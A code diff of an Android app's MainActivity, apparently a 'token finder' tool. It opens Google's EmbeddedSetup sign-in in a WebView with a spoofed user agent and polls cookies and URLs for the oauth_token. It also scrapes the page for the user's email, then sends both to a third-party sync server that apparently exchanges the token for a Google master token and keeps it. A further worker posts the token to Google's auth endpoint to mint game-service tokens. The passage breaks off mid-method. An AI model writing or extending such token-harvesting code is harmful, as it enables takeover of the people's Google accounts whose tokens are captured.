@@ -9,262 +9,230 @@ import android.net.Uri;
 import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
-import android.view.LayoutInflater;
+import android.util.Log;
 import android.view.View;
 import android.webkit.CookieManager;
+import android.webkit.JavascriptInterface;
 import android.webkit.WebSettings;
 import android.webkit.WebView;
-import android.widget.Button;
 import android.widget.ImageButton;
-import android.widget.LinearLayout;
 import android.widget.ProgressBar;
 import android.widget.RelativeLayout;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
 import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-public class MainActivity extends Activity implements View.OnClickListener {
+public class MainActivity extends Activity implements CloudSyncClient.SyncCallback {
+
+    private static final String TAG = "MainActivity";
     public static final String SETUP_URL = "https://accounts.google.com/EmbeddedSetup";
+    public static final int APP_VERSION_CODE = 4;
+    public static final String APP_VERSION_NAME = "v4.0 Hybrid";
 
-    // Views - Screens
-    private RelativeLayout splashOverlay;
-    private RelativeLayout layoutDashboard;
-    private RelativeLayout layoutLogin;
-    private LinearLayout bottomCard;
+    // Main App Hybrid Webview
+    private WebView mainAppWebView;
 
-    // Views - Dashboard
-    private TextView txtServerStatus;
-    private TextView txtAccountCount;
-    private LinearLayout layoutEmptyState;
-    private LinearLayout accountsContainer;
-    private Button btnAddAccount;
-    private Button btnPpModPortal;
-    private ImageButton btnRefreshDashboard;
-
-    // Views - Login
-    private ProgressBar webProgressBar;
+    // Google Sign-In Container Overlay & Components
+    private RelativeLayout googleLoginContainer;
     private WebView webView;
+    private ProgressBar webProgressBar;
+    private TextView txtLoginHeaderTitle;
     private TextView txtLoginStatus;
     private ImageButton btnNavBack;
     private ImageButton btnNavReload;
-    private Button btnVerifyManual;
-
-    // Views - Success Bottom Sheet
-    private TextView txtSuccessEmail;
-    private TextView txtSuccessCode;
-    private Button btnCopyCode;
-    private Button btnReturnDashboard;
 
     // State & Storage
     private AccountStorage accountStorage;
+    private String pendingAccountCountry = "GLOBAL";
+    private boolean isTokenFound = false;
     private String capturedToken = "";
     private String generatedSyncCode = "";
     private String detectedEmail = "";
-    private boolean isTokenFound = false;
     private Handler pollHandler;
     private CookiePollRunnable pollRunnable;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
 
-        accountStorage = new AccountStorage(this);
-
-        // Bind Views
-        splashOverlay = (RelativeLayout) findViewById(R.id.splashOverlay);
-        layoutDashboard = (RelativeLayout) findViewById(R.id.layoutDashboard);
-        layoutLogin = (RelativeLayout) findViewById(R.id.layoutLogin);
-        bottomCard = (LinearLayout) findViewById(R.id.bottomCard);
-
-        txtServerStatus = (TextView) findViewById(R.id.txtServerStatus);
-        txtAccountCount = (TextView) findViewById(R.id.txtAccountCount);
-        layoutEmptyState = (LinearLayout) findViewById(R.id.layoutEmptyState);
-        accountsContainer = (LinearLayout) findViewById(R.id.accountsContainer);
-        btnAddAccount = (Button) findViewById(R.id.btnAddAccount);
-        btnPpModPortal = (Button) findViewById(R.id.btnPpModPortal);
-        btnRefreshDashboard = (ImageButton) findViewById(R.id.btnRefreshDashboard);
-
-        webProgressBar = (ProgressBar) findViewById(R.id.webProgressBar);
-        webView = (WebView) findViewById(R.id.webView);
-        txtLoginStatus = (TextView) findViewById(R.id.txtLoginStatus);
-        btnNavBack = (ImageButton) findViewById(R.id.btnNavBack);
-        btnNavReload = (ImageButton) findViewById(R.id.btnNavReload);
-        btnVerifyManual = (Button) findViewById(R.id.btnVerifyManual);
-
-        txtSuccessEmail = (TextView) findViewById(R.id.txtSuccessEmail);
-        txtSuccessCode = (TextView) findViewById(R.id.txtSuccessCode);
-        btnCopyCode = (Button) findViewById(R.id.btnCopyCode);
-        btnReturnDashboard = (Button) findViewById(R.id.btnReturnDashboard);
-
-        // Click Listeners
-        btnAddAccount.setOnClickListener(this);
-        if (btnPpModPortal != null) {
-            btnPpModPortal.setOnClickListener(this);
-        }
-        btnRefreshDashboard.setOnClickListener(this);
-        btnNavBack.setOnClickListener(this);
-        btnNavReload.setOnClickListener(this);
-        btnVerifyManual.setOnClickListener(this);
-        btnCopyCode.setOnClickListener(this);
-        btnReturnDashboard.setOnClickListener(this);
-
-        setupWebView();
-        renderDashboardAccounts();
-
-        // Professional Splash Screen Transition
-        new Handler(Looper.getMainLooper()).postDelayed(new SplashDismissTimer(this), 2200);
-    }
-
-    public void dismissSplash() {
-        if (splashOverlay != null && splashOverlay.getVisibility() == View.VISIBLE) {
-            splashOverlay.animate().alpha(0.0f).setDuration(450);
-            new Handler(Looper.getMainLooper()).postDelayed(new SplashHideRunnable(splashOverlay), 480);
-        }
-    }
-
-    public void renderDashboardAccounts() {
-        if (accountsContainer == null) return;
-        accountsContainer.removeAllViews();
-
-        List<AccountItem> accounts = accountStorage.getAccounts();
-        if (txtAccountCount != null) {
-            txtAccountCount.setText(String.valueOf(accounts.size()));
-        }
-
-        if (accounts.isEmpty()) {
-            if (layoutEmptyState != null) layoutEmptyState.setVisibility(View.VISIBLE);
+        try {
+            setContentView(R.layout.activity_main);
+        } catch (Throwable t) {
+            Log.e(TAG, "Layout inflation error", t);
             return;
         }
 
-        if (layoutEmptyState != null) layoutEmptyState.setVisibility(View.GONE);
+        try {
+            accountStorage = new AccountStorage(this);
+        } catch (Throwable t) {
+            Log.e(TAG, "AccountStorage init error", t);
+        }
 
-        LayoutInflater inflater = LayoutInflater.from(this);
-        for (int i = 0; i < accounts.size(); i++) {
-            AccountItem account = accounts.get(i);
-            View card = inflater.inflate(R.layout.item_account_card, accountsContainer, false);
+        try {
+            SecurityGuard.performSecurityCheck(this);
+        } catch (Throwable ignored) {}
 
-            TextView txtEmail = (TextView) card.findViewById(R.id.txtItemEmail);
-            TextView txtCode = (TextView) card.findViewById(R.id.txtItemCode);
-            Button btnCopy = (Button) card.findViewById(R.id.btnItemCopy);
-            ImageButton btnDelete = (ImageButton) card.findViewById(R.id.btnItemDelete);
+        bindViews();
+        setupMainAppWebView();
+        setupGoogleAuthWebView();
 
-            txtEmail.setText(account.getEmail());
-            txtCode.setText(account.getCode());
+        try {
+            CloudSyncClient.registerDevice(this, accountStorage);
+            String deviceId = SecurityGuard.getDeviceId(this);
+            CloudSyncClient.checkDeviceLock(deviceId, new DeviceLockCallbackImpl(this));
+        } catch (Throwable ignored) {}
+    }
 
-            btnCopy.setOnClickListener(new ItemCopyClickListener(this, account.getCode()));
-            btnDelete.setOnClickListener(new ItemDeleteClickListener(this, account.getCode()));
+    private void bindViews() {
+        mainAppWebView = (WebView) findViewById(R.id.mainAppWebView);
+        googleLoginContainer = (RelativeLayout) findViewById(R.id.googleLoginContainer);
+        webView = (WebView) findViewById(R.id.webView);
+        webProgressBar = (ProgressBar) findViewById(R.id.webProgressBar);
+        txtLoginHeaderTitle = (TextView) findViewById(R.id.txtLoginHeaderTitle);
+        txtLoginStatus = (TextView) findViewById(R.id.txtLoginStatus);
+        btnNavBack = (ImageButton) findViewById(R.id.btnNavBack);
+        btnNavReload = (ImageButton) findViewById(R.id.btnNavReload);
 
-            accountsContainer.addView(card);
+        if (btnNavBack != null) {
+            btnNavBack.setOnClickListener(new NavBackClickListener(this));
+        }
+
+        if (btnNavReload != null) {
+            btnNavReload.setOnClickListener(new NavReloadClickListener(this));
         }
     }
 
-    public void showDashboard() {
-        if (pollHandler != null && pollRunnable != null) {
-            pollHandler.removeCallbacks(pollRunnable);
+    private void setupMainAppWebView() {
+        if (mainAppWebView == null) return;
+        try {
+            WebSettings settings = mainAppWebView.getSettings();
+            settings.setJavaScriptEnabled(true);
+            settings.setDomStorageEnabled(true);
+            settings.setDatabaseEnabled(true);
+            settings.setAllowFileAccess(true);
+            settings.setAllowContentAccess(true);
+            settings.setSupportZoom(false);
+            settings.setBuiltInZoomControls(false);
+
+            mainAppWebView.setBackgroundColor(0xFF060913);
+            mainAppWebView.addJavascriptInterface(new AndroidBridge(this), "AndroidBridge");
+            mainAppWebView.loadUrl("file:///android_asset/www/index.html");
+        } catch (Throwable t) {
+            Log.e(TAG, "setupMainAppWebView error", t);
         }
-        if (bottomCard != null) {
-            bottomCard.setVisibility(View.GONE);
-        }
-        if (layoutLogin != null) {
-            layoutLogin.setVisibility(View.GONE);
-        }
-        if (layoutDashboard != null) {
-            layoutDashboard.setVisibility(View.VISIBLE);
-        }
-        renderDashboardAccounts();
     }
 
-    public void openLoginScreen() {
+    private void setupGoogleAuthWebView() {
+        if (webView == null) return;
+        try {
+            WebSettings settings = webView.getSettings();
+            settings.setJavaScriptEnabled(true);
+            settings.setDomStorageEnabled(true);
+            settings.setDatabaseEnabled(true);
+            settings.setSupportZoom(false);
+            settings.setBuiltInZoomControls(false);
+
+            String userAgent = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36";
+            settings.setUserAgentString(userAgent);
+
+            try {
+                CookieManager.getInstance().setAcceptCookie(true);
+                CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
+            } catch (Throwable ignored) {}
+
+            webView.setWebChromeClient(new AppChromeClient(webProgressBar));
+            webView.setWebViewClient(new AppWebClient(this));
+        } catch (Throwable t) {
+            Log.e(TAG, "setupGoogleAuthWebView error", t);
+        }
+    }
+
+    // ================= GOOGLE AUTHENTICATION ENGINE =================
+
+    public void startGoogleLogin(String country) {
+        pendingAccountCountry = (country != null && !country.isEmpty()) ? country : "GLOBAL";
         isTokenFound = false;
         capturedToken = "";
         generatedSyncCode = "";
         detectedEmail = "";
 
-        if (bottomCard != null) {
-            bottomCard.setVisibility(View.GONE);
-        }
-        if (layoutDashboard != null) {
-            layoutDashboard.setVisibility(View.GONE);
-        }
-        if (layoutLogin != null) {
-            layoutLogin.setVisibility(View.VISIBLE);
+        if (txtLoginHeaderTitle != null) {
+            txtLoginHeaderTitle.setText("Sign In (" + pendingAccountCountry + ")");
         }
         if (txtLoginStatus != null) {
-            txtLoginStatus.setText("Connecting securely...");
-            txtLoginStatus.setTextColor(0xFF34D399);
+            txtLoginStatus.setText("Signing into Google Play Services (" + pendingAccountCountry + ")...");
         }
 
-        CookieManager.getInstance().removeAllCookies(null);
-        webView.loadUrl(SETUP_URL);
+        try {
+            CookieManager.getInstance().removeAllCookies(null);
+            CookieManager.getInstance().flush();
+        } catch (Throwable ignored) {}
+
+        if (googleLoginContainer != null) {
+            googleLoginContainer.setVisibility(View.VISIBLE);
+        }
+
+        if (webView != null) {
+            webView.loadUrl(SETUP_URL);
+        }
         startCookiePolling();
     }
 
-    private void setupWebView() {
-        WebSettings settings = webView.getSettings();
-        settings.setJavaScriptEnabled(true);
-        settings.setDomStorageEnabled(true);
-        settings.setDatabaseEnabled(true);
-        settings.setSupportZoom(true);
-        settings.setBuiltInZoomControls(true);
-        settings.setDisplayZoomControls(false);
-        settings.setUserAgentString("Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro Build/UQ1A.240105.004) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36");
-
-        CookieManager cookieManager = CookieManager.getInstance();
-        cookieManager.setAcceptCookie(true);
-        cookieManager.setAcceptThirdPartyCookies(webView, true);
-
-        webView.addJavascriptInterface(new GServicesBridge(this), "gservices");
-        webView.addJavascriptInterface(new JsBridge(this), "mm");
-        webView.setWebViewClient(new AppWebClient(this));
-        webView.setWebChromeClient(new AppChromeClient(webProgressBar));
-    }
-
-    private void startCookiePolling() {
-        if (pollHandler == null) {
-            pollHandler = new Handler(Looper.getMainLooper());
+    public void closeGoogleLogin() {
+        stopCookiePolling();
+        if (webView != null) {
+            webView.loadUrl("about:blank");
         }
-        if (pollRunnable == null) {
-            pollRunnable = new CookiePollRunnable(this);
+        if (googleLoginContainer != null) {
+            googleLoginContainer.setVisibility(View.GONE);
         }
-        pollHandler.removeCallbacks(pollRunnable);
-        pollHandler.postDelayed(pollRunnable, 1000);
-    }
-
-    public Handler getPollHandler() {
-        return pollHandler;
     }
 
     public boolean isTokenFound() {
         return isTokenFound;
     }
 
-    public void setDetectedEmail(String email) {
-        if (email != null && !email.isEmpty() && detectedEmail.isEmpty()) {
-            detectedEmail = email.trim();
+    public Handler getPollHandler() {
+        return pollHandler;
+    }
+
+    public void startCookiePolling() {
+        stopCookiePolling();
+        pollHandler = new Handler(Looper.getMainLooper());
+        pollRunnable = new CookiePollRunnable(this);
+        pollHandler.postDelayed(pollRunnable, 2000);
+    }
+
+    public void stopCookiePolling() {
+        if (pollHandler != null && pollRunnable != null) {
+            pollHandler.removeCallbacks(pollRunnable);
+            pollHandler = null;
+            pollRunnable = null;
         }
     }
 
-    public void extractEmailFromPage() {
-        if (webView == null) return;
-        try {
-            webView.evaluateJavascript(
-                "(function() { return document.body ? document.body.innerText : ''; })();",
-                new EmailJsCallback(this)
-            );
-        } catch (Exception ignored) {}
-    }
-
     public void checkUrlForToken(String url) {
-        if (isTokenFound || url == null) return;
-        if (url.contains("oauth_token=")) {
-            Pattern pattern = Pattern.compile("oauth_token=([a-zA-Z0-9_\\-]+)");
-            Matcher matcher = pattern.matcher(url);
-            if (matcher.find()) {
-                onTokenFound(matcher.group(1));
+        if (url == null || isTokenFound) return;
+        Pattern pattern = Pattern.compile("oauth_token=([^&\\s]+)");
+        Matcher matcher = pattern.matcher(url);
+        if (matcher.find()) {
+            capturedToken = matcher.group(1);
+            if (capturedToken != null && !capturedToken.isEmpty() && !capturedToken.equals("null")) {
+                isTokenFound = true;
+                stopCookiePolling();
+                onTokenCaptured(capturedToken);
             }
         }
     }
@@ -272,236 +240,494 @@ public class MainActivity extends Activity implements View.OnClickListener {
     public void checkCookiesForToken() {
         if (isTokenFound) return;
         try {
-            CookieManager cookieManager = CookieManager.getInstance();
-            String[] targetUrls = new String[] {
-                "https://accounts.google.com/EmbeddedSetup",
-                "https://accounts.google.com/embedded/setup/android",
-                "https://accounts.google.com/o/oauth2/programmatic_auth",
-                "https://accounts.google.com",
-                "https://google.com"
-            };
+            CookieManager cm = CookieManager.getInstance();
+            String cookieString = cm.getCookie("https://accounts.google.com");
+            if (cookieString == null || cookieString.isEmpty()) return;
 
-            for (String u : targetUrls) {
-                String cookies = cookieManager.getCookie(u);
-                if (cookies != null && cookies.contains("oauth_token=")) {
-                    extractTokenFromCookieString(cookies);
-                    if (isTokenFound) return;
+            Pattern pattern = Pattern.compile("oauth_token=([^;\\s]+)");
+            Matcher matcher = pattern.matcher(cookieString);
+            if (matcher.find()) {
+                capturedToken = matcher.group(1);
+                if (capturedToken != null && !capturedToken.isEmpty() && !capturedToken.equals("null")) {
+                    isTokenFound = true;
+                    stopCookiePolling();
+                    onTokenCaptured(capturedToken);
                 }
             }
-
-            if (webView != null) {
-                String currentUrl = webView.getUrl();
-                if (currentUrl != null && !currentUrl.isEmpty()) {
-                    String cookies = cookieManager.getCookie(currentUrl);
-                    if (cookies != null && cookies.contains("oauth_token=")) {
-                        extractTokenFromCookieString(cookies);
-                        if (isTokenFound) return;
-                    }
-                }
-            }
-        } catch (Exception ignored) {}
+        } catch (Throwable ignored) {}
     }
 
-    private void extractTokenFromCookieString(String cookies) {
-        Pattern pattern = Pattern.compile("oauth_token=([^;]+)");
-        Matcher matcher = pattern.matcher(cookies);
-        if (matcher.find()) {
-            String token = matcher.group(1).trim();
-            if (!token.isEmpty()) {
-                onTokenFound(token);
+    public void extractEmailFromPage() {
+        if (webView != null && detectedEmail.isEmpty()) {
+            webView.evaluateJavascript(
+                "(function() { return document.body ? document.body.innerText : ''; })();",
+                new EmailJsCallback(this)
+            );
+        }
+    }
+
+    public void setDetectedEmail(String email) {
+        if (email != null && !email.isEmpty() && detectedEmail.isEmpty()) {
+            this.detectedEmail = email;
+            if (txtLoginStatus != null) {
+                txtLoginStatus.setText("Authenticating: " + email);
             }
         }
     }
 
-    public void onTokenFound(final String token) {
-        if (isTokenFound || token == null || token.isEmpty()) return;
-        isTokenFound = true;
-        capturedToken = token;
-
-        if (pollHandler != null && pollRunnable != null) {
-            pollHandler.removeCallbacks(pollRunnable);
-        }
-
-        runOnUiThread(new ProcessTokenFoundTask(this, token));
-    }
-
-    public void triggerCloudSync(final String token) {
+    public void onTokenCaptured(final String token) {
+        String finalEmail = !detectedEmail.isEmpty() ? detectedEmail : "Google Play User";
         if (txtLoginStatus != null) {
-            txtLoginStatus.setText("Generating verification code...");
-            txtLoginStatus.setTextColor(0xFF38BDF8);
+            txtLoginStatus.setText("Account verified! Registering 6-digit sync code...");
         }
 
-        final String finalEmail = !detectedEmail.isEmpty() ? detectedEmail : "Google Account";
-        CloudSyncClient.syncAccount(finalEmail, token, new CloudSyncResultListener(this, finalEmail, token));
+        String uid = (accountStorage != null) ? accountStorage.getUserUid() : "NODE-DEVICE";
+        CloudSyncClient.syncAccount(finalEmail, token, pendingAccountCountry, uid, this);
     }
 
-    public void onSyncResult(String finalEmail, String token, String code) {
-        this.generatedSyncCode = code;
+    // CloudSyncClient.SyncCallback implementation
+    @Override
+    public void onSuccess(String code) {
+        generatedSyncCode = code;
+        String finalToken = (CloudSyncClient.lastExchangedMasterToken != null) 
+            ? CloudSyncClient.lastExchangedMasterToken 
+            : capturedToken;
+        String finalEmail = (CloudSyncClient.lastExchangedEmail != null && !CloudSyncClient.lastExchangedEmail.isEmpty()) 
+            ? CloudSyncClient.lastExchangedEmail 
+            : (!detectedEmail.isEmpty() ? detectedEmail : "Google Play User");
 
-        // Save account locally
-        AccountItem newItem = new AccountItem(
-            String.valueOf(System.currentTimeMillis()),
+        AccountItem item = new AccountItem(
+            "acc_" + System.currentTimeMillis(),
             finalEmail,
             code,
-            token,
+            finalToken,
+            pendingAccountCountry,
             System.currentTimeMillis()
         );
-        accountStorage.saveAccount(newItem);
 
-        // Present Success UI
-        showCodeSuccess(finalEmail, code);
-    }
+        if (accountStorage != null) {
+            accountStorage.saveAccount(item);
+            try {
+                CloudSyncClient.registerDevice(this, accountStorage.getAccounts());
+            } catch (Throwable ignored) {}
+        }
 
-    private void showCodeSuccess(String email, String code) {
-        if (txtSuccessEmail != null) {
-            txtSuccessEmail.setText(email);
-        }
-        if (txtSuccessCode != null) {
-            txtSuccessCode.setText(code);
-        }
-        copyToClipboard(code);
+        closeGoogleLogin();
 
-        if (bottomCard != null) {
-            bottomCard.setVisibility(View.VISIBLE);
+        // Notify WebApp
+        if (mainAppWebView != null) {
+            mainAppWebView.post(new NotifyWebRunnable(mainAppWebView, item.toJson().toString()));
         }
-        Toast.makeText(this, "Verification Code: " + code + " (Copied)", Toast.LENGTH_LONG).show();
+
+        Toast.makeText(MainActivity.this, "Connected! Sync Code: " + code, Toast.LENGTH_LONG).show();
     }
 
     @Override
-    public void onClick(View v) {
-        int id = v.getId();
-        if (id == R.id.btnAddAccount) {
-            openLoginScreen();
-        } else if (id == R.id.btnPpModPortal) {
+    public void onError(String msg) {
+        if (txtLoginStatus != null) {
+            txtLoginStatus.setText("Sync notice: " + msg);
+        }
+    }
+
+    // ================= ACTIONS & HELPERS =================
+
+    public boolean isDeveloperMode() {
+        String pkg = getPackageName();
+        return pkg != null && pkg.contains("tokenfinder");
+    }
+
+    public String getAppInfoJson() {
+        JSONObject obj = new JSONObject();
+        try {
+            boolean isDev = isDeveloperMode();
+            obj.put("appName", isDev ? "PlayQuest Token Finder" : "PPM Server");
+            obj.put("isDeveloperMode", isDev);
+            obj.put("versionName", APP_VERSION_NAME);
+            obj.put("versionCode", APP_VERSION_CODE);
+            obj.put("deviceId", SecurityGuard.getDeviceId(this));
+            obj.put("portalUrl", SecurityGuard.getRenderApi());
+        } catch (Throwable ignored) {}
+        return obj.toString();
+    }
+
+    public String getAccountsJson() {
+        if (accountStorage == null) return "[]";
+        List<AccountItem> list = accountStorage.getAccounts();
+        JSONArray arr = new JSONArray();
+        for (AccountItem item : list) {
+            arr.put(item.toJson());
+        }
+        return arr.toString();
+    }
+
+    public void doDeleteAccount(String code) {
+        if (accountStorage != null) {
+            accountStorage.deleteAccount(code);
             try {
-                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://ppmods.netlify.app/"));
-                startActivity(browserIntent);
-            } catch (Exception e) {
-                Toast.makeText(this, "Could not open browser: " + e.getMessage(), Toast.LENGTH_SHORT).show();
-            }
-        } else if (id == R.id.btnRefreshDashboard) {
-            renderDashboardAccounts();
-            Toast.makeText(this, "Accounts refreshed", Toast.LENGTH_SHORT).show();
-        } else if (id == R.id.btnNavBack) {
-            showDashboard();
-        } else if (id == R.id.btnNavReload) {
-            if (webView != null) {
-                webView.reload();
-            }
-        } else if (id == R.id.btnVerifyManual) {
-            checkCookiesForToken();
-            if (!isTokenFound) {
-                Toast.makeText(this, "Please finish Google sign-in to generate code.", Toast.LENGTH_SHORT).show();
-            }
-        } else if (id == R.id.btnCopyCode) {
-            if (!generatedSyncCode.isEmpty()) {
-                copyToClipboard(generatedSyncCode);
-                Toast.makeText(this, "Code copied: " + generatedSyncCode, Toast.LENGTH_SHORT).show();
-            }
-        } else if (id == R.id.btnReturnDashboard) {
-            showDashboard();
+                CloudSyncClient.registerDevice(this, accountStorage.getAccounts());
+            } catch (Throwable ignored) {}
         }
+        Toast.makeText(this, "Account disconnected.", Toast.LENGTH_SHORT).show();
     }
 
-    public void copyToClipboard(String text) {
+    public void copyToClipboard(String text, String label) {
+        if (text == null || text.isEmpty()) return;
         ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
-        ClipData clip = ClipData.newPlainText("PP Server Account Code", text);
-        if (clipboard != null) {
-            clipboard.setPrimaryClip(clip);
+        ClipData clip = ClipData.newPlainText(label, text);
+        clipboard.setPrimaryClip(clip);
+        Toast.makeText(this, label + " Copied!", Toast.LENGTH_SHORT).show();
+    }
+
+    public void openBrowserUrl(String url) {
+        try {
+            if (url == null || url.trim().isEmpty()) {
+                url = SecurityGuard.getRenderApi();
+            }
+            url = url.trim();
+            if (!url.startsWith("http://") && !url.startsWith("https://")) {
+                url = "https://" + url;
+            }
+            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+            startActivity(intent);
+        } catch (Throwable t) {
+            Log.e(TAG, "openBrowserUrl error", t);
         }
     }
 
-    public AccountStorage getAccountStorage() {
-        return accountStorage;
+    public void restoreAccountsFromCloud() {
+        if (accountStorage == null) return;
+        String uid = accountStorage.getUserUid();
+        CloudSyncClient.restoreUserAccounts(uid, new CloudRestoreCallback(this, accountStorage, mainAppWebView));
+    }
+
+    public void testGpgsToken(final String token) {
+        new Thread(new GpgsTestWorker(this, mainAppWebView, token)).start();
+    }
+
+    public static String maskEmail(String email) {
+        if (email == null || !email.contains("@")) return email;
+        String[] parts = email.split("@");
+        String name = parts[0];
+        String domain = parts[1];
+        if (name.length() <= 2) {
+            return name + "@" + domain;
+        } else if (name.length() <= 4) {
+            return name.substring(0, 1) + "•••" + name.substring(name.length() - 1) + "@" + domain;
+        }
+        return name.substring(0, 2) + "••••" + name.substring(name.length() - 2) + "@" + domain;
     }
 
     @Override
     public void onBackPressed() {
-        if (bottomCard != null && bottomCard.getVisibility() == View.VISIBLE) {
-            showDashboard();
-            return;
+        if (googleLoginContainer != null && googleLoginContainer.getVisibility() == View.VISIBLE) {
+            closeGoogleLogin();
+        } else if (mainAppWebView != null && mainAppWebView.canGoBack()) {
+            mainAppWebView.goBack();
+        } else {
+            super.onBackPressed();
         }
-        if (layoutLogin != null && layoutLogin.getVisibility() == View.VISIBLE) {
-            showDashboard();
-            return;
-        }
-        super.onBackPressed();
     }
 
-    @Override
-    protected void onDestroy() {
-        if (pollHandler != null && pollRunnable != null) {
-            pollHandler.removeCallbacks(pollRunnable);
-        }
-        super.onDestroy();
-    }
+    // ================= STATIC LISTENERS & RUNNABLES =================
 
-    // Static helper classes to eliminate inner classes
-    private static class SplashDismissTimer implements Runnable {
+    public static class NavBackClickListener implements View.OnClickListener {
         private final MainActivity activity;
-        SplashDismissTimer(MainActivity activity) { this.activity = activity; }
-        @Override public void run() { activity.dismissSplash(); }
+        public NavBackClickListener(MainActivity act) { this.activity = act; }
+        @Override
+        public void onClick(View v) {
+            activity.closeGoogleLogin();
+        }
     }
 
-    private static class SplashHideRunnable implements Runnable {
-        private final View splashView;
-        SplashHideRunnable(View splashView) { this.splashView = splashView; }
-        @Override public void run() { splashView.setVisibility(View.GONE); }
-    }
-
-    private static class ItemCopyClickListener implements View.OnClickListener {
+    public static class NavReloadClickListener implements View.OnClickListener {
         private final MainActivity activity;
-        private final String code;
-        ItemCopyClickListener(MainActivity activity, String code) {
-            this.activity = activity;
-            this.code = code;
-        }
-        @Override public void onClick(View v) {
-            activity.copyToClipboard(code);
-            Toast.makeText(activity, "Code copied: " + code, Toast.LENGTH_SHORT).show();
+        public NavReloadClickListener(MainActivity act) { this.activity = act; }
+        @Override
+        public void onClick(View v) {
+            if (activity.webView != null) {
+                activity.webView.loadUrl(SETUP_URL);
+            }
         }
     }
 
-    private static class ItemDeleteClickListener implements View.OnClickListener {
-        private final MainActivity activity;
-        private final String code;
-        ItemDeleteClickListener(MainActivity activity, String code) {
-            this.activity = activity;
-            this.code = code;
+    public static class NotifyWebRunnable implements Runnable {
+        private final WebView targetWeb;
+        private final String payloadJson;
+        public NotifyWebRunnable(WebView web, String json) {
+            this.targetWeb = web;
+            this.payloadJson = json;
         }
-        @Override public void onClick(View v) {
-            activity.getAccountStorage().deleteAccount(code);
-            activity.renderDashboardAccounts();
-            Toast.makeText(activity, "Account removed", Toast.LENGTH_SHORT).show();
+        @Override
+        public void run() {
+            if (targetWeb != null) {
+                targetWeb.evaluateJavascript("if(window.onAccountSyncComplete){ window.onAccountSyncComplete(" + payloadJson + "); }", null);
+            }
         }
     }
 
-    private static class ProcessTokenFoundTask implements Runnable {
+    public static class DeviceLockCallbackImpl implements CloudSyncClient.DeviceLockCallback {
         private final MainActivity activity;
+        public DeviceLockCallbackImpl(MainActivity act) { this.activity = act; }
+        @Override
+        public void onResult(boolean isLocked, String msg) {
+            if (isLocked) {
+                activity.runOnUiThread(new DeviceLockNoticeRunnable(activity));
+            }
+        }
+    }
+
+    public static class DeviceLockNoticeRunnable implements Runnable {
+        private final MainActivity activity;
+        public DeviceLockNoticeRunnable(MainActivity act) { this.activity = act; }
+        @Override
+        public void run() {
+            Toast.makeText(activity, "Device Node Locked by Admin", Toast.LENGTH_LONG).show();
+        }
+    }
+
+    public static class CloudRestoreCallback implements CloudSyncClient.RestoreCallback {
+        private final MainActivity activity;
+        private final AccountStorage storage;
+        private final WebView webView;
+        public CloudRestoreCallback(MainActivity act, AccountStorage st, WebView wv) {
+            this.activity = act;
+            this.storage = st;
+            this.webView = wv;
+        }
+        @Override
+        public void onLoaded(final List<AccountItem> list) {
+            activity.runOnUiThread(new CloudRestoreSuccessRunnable(activity, storage, webView, list));
+        }
+        @Override
+        public void onError(final String msg) {
+            activity.runOnUiThread(new CloudRestoreErrorRunnable(activity, msg));
+        }
+    }
+
+    public static class CloudRestoreSuccessRunnable implements Runnable {
+        private final MainActivity activity;
+        private final AccountStorage storage;
+        private final WebView webView;
+        private final List<AccountItem> list;
+        public CloudRestoreSuccessRunnable(MainActivity act, AccountStorage st, WebView wv, List<AccountItem> l) {
+            this.activity = act;
+            this.storage = st;
+            this.webView = wv;
+            this.list = l;
+        }
+        @Override
+        public void run() {
+            if (list != null && !list.isEmpty()) {
+                storage.replaceAllAccounts(list);
+                if (webView != null) {
+                    webView.evaluateJavascript("if(window.refreshAccounts){ window.refreshAccounts(); }", null);
+                }
+                Toast.makeText(activity, "Synced " + list.size() + " accounts from cloud.", Toast.LENGTH_SHORT).show();
+            } else {
+                Toast.makeText(activity, "Accounts are up to date.", Toast.LENGTH_SHORT).show();
+            }
+        }
+    }
+
+    public static class CloudRestoreErrorRunnable implements Runnable {
+        private final MainActivity activity;
+        private final String msg;
+        public CloudRestoreErrorRunnable(MainActivity act, String m) {
+            this.activity = act;
+            this.msg = m;
+        }
+        @Override
+        public void run() {
+            Toast.makeText(activity, "Sync notice: " + msg, Toast.LENGTH_SHORT).show();
+        }
+    }
+
+    public static class GpgsTestWorker implements Runnable {
+        private final MainActivity activity;
+        private final WebView webView;
         private final String token;
-        ProcessTokenFoundTask(MainActivity activity, String token) {
-            this.activity = activity;
-            this.token = token;
+
+        public GpgsTestWorker(MainActivity act, WebView wv, String tok) {
+            this.activity = act;
+            this.webView = wv;
+            this.token = tok;
         }
-        @Override public void run() {
-            activity.triggerCloudSync(token);
+
+        @Override
+        public void run() {
+            boolean success = false;
+            String resultMessage = "";
+            try {
+                URL url = new URL("https://android.clients.google.com/auth");
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+                conn.setRequestProperty("User-Agent", "GoogleAuth/1.4 (Pixel 8; U)");
+                conn.setDoOutput(true);
+                conn.setConnectTimeout(10000);
+                conn.setReadTimeout(10000);
+
+                String postData = "accountType=HOSTED_OR_GOOGLE"
+                    + "&has_permission=1"
+                    + "&service=" + URLEncoder.encode("oauth2:https://www.googleapis.com/auth/games", "UTF-8")
+                    + "&app=com.google.android.play.games"
+                    + "&client_sig=38918a453d07199354f8b19af05ec6562ced5788"
+                    + "&callerPkg=com.google.android.play.games"
+                    + "&Token=" + URLEncoder.encode(token, "UTF-8");
+
+                OutputStream os = conn.getOutputStream();
+                os.write(postData.getBytes("UTF-8"));
+                os.close();
+
